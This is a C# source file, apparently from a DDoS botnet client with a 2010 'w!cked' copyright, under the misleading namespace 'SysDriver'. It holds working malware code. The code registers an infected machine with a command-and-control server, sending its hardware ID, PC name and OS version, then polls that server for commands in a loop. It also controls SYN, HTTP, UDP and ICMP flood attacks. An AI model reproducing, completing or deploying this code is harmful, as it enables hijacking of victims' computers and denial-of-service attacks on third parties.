using System;
using System.IO;
using System.Text;
using System.Net;
using System.Threading;

namespace SysDriver
{
    /* Copyright © 2010 w!cked */

    class cControl : cCommandHandler
    {
        private string sOldCommand = string.Empty;

        public void ConnectControl()
        {
            registerCCServer();

            Thread recvThread = new Thread(new ThreadStart(getCCServerCommand));
            recvThread.Start();
        }

        private void registerCCServer()
        {
            string sParameters = "mode=0&hwid=" + cMain.ConfigClass.sHWID +
                "&pcname=" + cMain.ConfigClass.sPCName +
                    "&version=" + cMain.ConfigClass.sBotVersion +
                        "&system=" + cMain.ConfigClass.sWinVersion;

            while (true)
            {
                try
                {
                    string sAuthCode = HTTPRequest(cMain.ConfigClass.sCServerAddress, sParameters);

                    if (sAuthCode.Length > 0)
                    {
                        if (sAuthCode == cMain.ConfigClass.sAuthCode)
                        {
                            return;
                        }
                        else
                        {
                            Environment.Exit(0);
                        }
                    }
                }
                catch { }

                Thread.Sleep((int)(cMain.ConfigClass.iConnectionInterval * 0x3e8));
            }
        }

        private void getCCServerCommand()
        {
            string sParameters = "mode=1&hwid=" + cMain.ConfigClass.sHWID;

            while (true)
            {
                try
                {
                    string sCommand = HTTPRequest(cMain.ConfigClass.sCServerAddress, sParameters);

                    if (sCommand.Length > 0)
                    {
                        if (sCommand != sOldCommand)
                        {
                            handleCommand(sCommand);
                            sOldCommand = sCommand;
                        }
                    }
                    else
                    {
                        try { nSYNFlood.StopSYNFlood(); }
                        catch { }

                        try
                        { nHTTPFlood.StopHTTPFlood(); }
                        catch { }

                        try { nUDPFlood.StopUDPFlood(); }
                        catch { }

                        try
                        { nICMPFlood.StopICMPFlood(); }
                        catch { }

                        sOldCommand = string.Empty;
                    }
                }
                catch { }

                Thread.Sleep((int)(cMain.ConfigClass.iConnectionInterval * 0x3e8));
            }
        }

        private string HTTPRequest(string URI, string Parameters)
        {
            ServicePointManager.Expect100Continue = false;
            HttpWebRequest wRequest = (HttpWebRequest)WebRequest.Create(URI);
            wRequest.ContentType = "application/x-www-form-urlencoded";
            wRequest.Method = "POST";
            wRequest.UserAgent = cMain.ConfigClass.sAuthCode;

            byte[] bBytes = Encoding.Default.GetBytes(Parameters);
            wRequest.ContentLength = bBytes.Length;

            Stream rStream = wRequest.GetRequestStream();
            rStream.Write(bBytes, 0, bBytes.Length);
            rStream.Close();

            WebResponse wResponse = wRequest.GetResponse();
            if (wResponse == null)
            {
                return string.Empty;
            }
            else
            {
                StreamReader sReader = new StreamReader(wResponse.GetResponseStream());
                return sReader.ReadToEnd().Trim();
            }
        }
    }
}
